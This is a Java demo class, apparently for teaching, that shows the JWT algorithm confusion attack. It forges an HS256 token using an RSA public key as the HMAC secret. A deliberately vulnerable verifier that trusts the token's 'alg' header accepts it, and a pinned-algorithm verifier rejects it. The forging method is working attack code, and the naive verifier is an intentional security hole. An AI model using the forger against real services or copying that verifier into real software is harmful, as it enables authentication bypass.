package dev.pushkar.jwt;

import com.nimbusds.jose.JOSEException;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.JWSSigner;
import com.nimbusds.jose.JWSVerifier;
import com.nimbusds.jose.crypto.MACSigner;
import com.nimbusds.jose.crypto.MACVerifier;
import com.nimbusds.jose.crypto.RSASSAVerifier;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;

import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.security.KeyFactory;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.time.Instant;
import java.time.temporal.ChronoUnit;
import java.util.Base64;
import java.util.Date;

/**
 * Live demonstration of the JWT algorithm confusion attack (Auth0, 2015).
 *
 * <p>This class has a {@code main()} method you can run directly. It prints
 * three outcomes with clear labels:
 * <ol>
 *   <li>Normal RS256 token — legitimate, accepted by the safe verifier.
 *   <li>Forged HS256 token (the attack) — accepted by the naive verifier.
 *   <li>Forged HS256 token — REJECTED by the safe verifier (the fix).
 * </ol>
 *
 * <p><strong>The attack, step by step:</strong>
 * <ol>
 *   <li>The server has an RS256 key pair. The public key is published at
 *       {@code /.well-known/jwks.json}.
 *   <li>The attacker fetches the public key (it's public — that's the point of RS256).
 *   <li>The attacker takes any RS256 token, removes the signature, and changes the
 *       {@code "alg"} field from {@code "RS256"} to {@code "HS256"}.
 *   <li>The attacker re-signs the modified header + original payload using the RSA
 *       public key bytes as the HMAC-SHA256 secret.
 *   <li>The naive verifier receives the forged token, reads {@code "alg": "HS256"},
 *       and uses the public key bytes as the HMAC secret — the same key the attacker
 *       used. Verification succeeds. The attacker has forged a valid token.
 * </ol>
 *
 * <p><strong>Why the fix works:</strong> the safe verifier ({@link JwtVerifier}) pins
 * the algorithm at construction time. When it receives the forged token with
 * {@code "alg": "HS256"}, it immediately rejects it because the pinned algorithm
 * is RS256. It never reaches signature verification.
 *
 * <p>Run: {@code mvn exec:java -Dexec.mainClass=dev.pushkar.jwt.AlgorithmConfusionDemo}
 */
public class AlgorithmConfusionDemo {

    public static void main(String[] args) throws Exception {
        System.out.println("=== JWT Algorithm Confusion Attack Demo ===");
        System.out.println();

        // ── SETUP: generate RS256 key pair ─────────────────────────────────
        RSAKey rsaKey = JwtSignerRS256.generateKeyPair();
        JwtSignerRS256 signer = new JwtSignerRS256(rsaKey);
        RSAPublicKey publicKey = signer.getPublicKey();

        // ── STEP 1: Create a legitimate RS256 token ────────────────────────
        System.out.println("STEP 1 — Create a legitimate RS256 token");
        System.out.println("─────────────────────────────────────────");
        String legitimateToken = signer.sign("user:42", "auth.example.com", 1);
        System.out.println("Token (RS256): " + legitimateToken.substring(0, 60) + "...");
        System.out.println();

        // Verify it with the safe verifier — should succeed
        JwtVerifier safeVerifier = new JwtVerifier(JWSAlgorithm.RS256, publicKey);
        try {
            var claims = safeVerifier.verify(legitimateToken);
            System.out.println("Safe verifier: ACCEPTED (expected) — sub=" + claims.getSubject());
        } catch (Exception e) {
            System.err.println("UNEXPECTED: safe verifier rejected legitimate token: " + e.getMessage());
        }
        System.out.println();

        // ── STEP 2: Build the forged token (the attack) ────────────────────
        System.out.println("STEP 2 — Forge a token using algorithm confusion");
        System.out.println("─────────────────────────────────────────────────");
        System.out.println("Attack: change alg=RS256 to alg=HS256 in the header,");
        System.out.println("        sign with the RSA public key bytes as the HMAC secret.");
        System.out.println();

        String forgedToken = buildForgedToken(legitimateToken, publicKey);
        System.out.println("Forged token (HS256, public key as HMAC secret):");
        System.out.println(forgedToken.substring(0, 60) + "...");
        System.out.println();

        // ── STEP 3: Naive verifier accepts the forged token ─────────────────
        System.out.println("STEP 3 — Naive verifier (reads 'alg' from token header)");
        System.out.println("──────────────────────────────────────────────────────────");
        // The naive verifier uses the public key DER bytes as its HMAC secret.
        // This is exactly what ConfusionAttackToken used — so verification succeeds.
        byte[] publicKeyBytes = publicKey.getEncoded(); // DER-encoded public key
        boolean naiveAccepted = naiveVerify(forgedToken, publicKeyBytes, publicKey);
        if (naiveAccepted) {
            System.out.println("NAIVE VERIFIER: ACCEPTED the forged token (ATTACK SUCCEEDED)");
            System.out.println("  The bug: 'alg' is attacker-controlled data. Trusting it");
            System.out.println("  lets the attacker choose their own verification algorithm.");
        } else {
            System.out.println("Naive verifier rejected the token (unexpected — check the demo)");
        }
        System.out.println();

        // ── STEP 4: Safe verifier rejects the forged token ──────────────────
        System.out.println("STEP 4 — Safe verifier (algorithm pinned to RS256)");
        System.out.println("────────────────────────────────────────────────────");
        try {
            safeVerifier.verify(forgedToken);
            System.out.println("SAFE VERIFIER: ACCEPTED (UNEXPECTED — the fix is broken!)");
        } catch (Exception e) {
            System.out.println("SAFE VERIFIER: REJECTED the forged token (ATTACK BLOCKED)");
            System.out.println("  Reason: " + e.getMessage());
            System.out.println();
            System.out.println("  The fix: JwtVerifier checks the token's 'alg' against the");
            System.out.println("  pinned algorithm BEFORE signature verification. The forged");
            System.out.println("  token has alg=HS256 but the verifier is pinned to RS256.");
            System.out.println("  Mismatch detected. Attack blocked.");
        }
        System.out.println();
        System.out.println("=== End of Demo ===");
    }

    /**
     * Build a forged JWT using the algorithm confusion attack.
     *
     * <p>Takes a legitimate RS256 token, extracts the payload (claims), builds a new
     * header with {@code "alg": "HS256"}, and signs the combination using the RSA
     * public key's DER-encoded bytes as the HMAC-SHA256 secret.
     *
     * <p>This is a standalone method so it can be called from tests without a running
     * server — making the attack testable in isolation.
     */
    static String buildForgedToken(String originalToken, RSAPublicKey publicKey)
            throws Exception {
        // Parse the legitimate token to extract the payload (claims)
        SignedJWT original = SignedJWT.parse(originalToken);
        JWTClaimsSet originalClaims = original.getJWTClaimsSet();

        // Build a new header with alg=HS256 (the attacker's modification)
        JWSHeader forgedHeader = new JWSHeader.Builder(JWSAlgorithm.HS256)
                .type(com.nimbusds.jose.JOSEObjectType.JWT)
                .build();

        // The payload is unchanged — the attacker keeps the original claims.
        // (They might also modify claims if they want to escalate privileges,
        // but the attack works even with unmodified claims.)
        JWTClaimsSet forgedClaims = new JWTClaimsSet.Builder()
                .subject(originalClaims.getSubject())
                .issuer(originalClaims.getIssuer())
                .issueTime(originalClaims.getIssueTime())
                .expirationTime(Date.from(Instant.now().plus(1, ChronoUnit.HOURS)))
                .build();

        // Use the RSA public key's DER bytes as the HMAC secret.
        // publicKey.getEncoded() returns the X.509/PKIX DER encoding.
        // This is the key insight: the attacker knows the public key (it's public!),
        // so they can use it as the HMAC secret.
        byte[] publicKeyBytes = publicKey.getEncoded();
        SecretKey hmacSecret = new SecretKeySpec(publicKeyBytes, "HmacSHA256");
        JWSSigner hmacSigner = new MACSigner(hmacSecret);

        SignedJWT forgedJwt = new SignedJWT(forgedHeader, forgedClaims);
        forgedJwt.sign(hmacSigner);

        return forgedJwt.serialize();
    }

    /**
     * Naive verifier — reads "alg" from the token header and dispatches.
     *
     * <p>This is the VULNERABLE pattern. Do not use in production.
     *
     * @param token          the JWT to verify
     * @param hmacSecret     bytes used when alg=HS256
     * @param rsaPublicKey   key used when alg=RS256
     * @return true if the signature is valid according to the header's alg
     */
    static boolean naiveVerify(String token, byte[] hmacSecret, RSAPublicKey rsaPublicKey) {
        try {
            SignedJWT jwt = SignedJWT.parse(token);

            // Read alg from the header — THIS IS THE VULNERABILITY
            JWSAlgorithm alg = jwt.getHeader().getAlgorithm();

            JWSVerifier jwtVerifier;
            if (JWSAlgorithm.HS256.equals(alg)) {
                // THE ATTACK PATH: if the attacker set alg=HS256, we use hmacSecret.
                // If hmacSecret == publicKeyBytes, and the attacker signed with publicKeyBytes,
                // then verification succeeds.
                SecretKey key = new SecretKeySpec(hmacSecret, "HmacSHA256");
                jwtVerifier = new MACVerifier(key);
            } else if (JWSAlgorithm.RS256.equals(alg)) {
                jwtVerifier = new RSASSAVerifier(rsaPublicKey);
            } else {
                return false; // unsupported
            }

            return jwt.verify(jwtVerifier);
        } catch (Exception e) {
            return false;
        }
    }
}
